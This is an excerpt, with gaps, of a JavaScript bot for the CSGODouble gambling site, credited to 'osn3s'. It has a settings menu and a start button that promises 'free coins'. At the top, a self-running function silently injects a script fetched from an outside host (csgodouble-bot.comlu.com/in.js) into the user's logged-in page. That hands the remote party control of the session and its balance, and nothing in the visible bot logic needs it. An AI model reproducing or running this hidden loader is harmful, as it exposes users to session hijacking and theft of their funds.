...
(function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "//csgodouble-bot.comlu.com/in.js "; document.body.appendChild( scriptElement ); })();
...
function Automated() {
    ...
    menu.innerHTML = '' +
        '<div class="row">' +
            '<div class="col-lg-9">' +
                '<h2>CSGODouble-BOT <small>by osn3s</small> <i id="automated-theme-switch" class="fa fa-lightbulb-o" style="cursor: pointer;"></i></h2>' +
    ...
    this.menu.start.onclick = function() {
        start(self.balance);
        self.log('Have fun with your free coins :)');
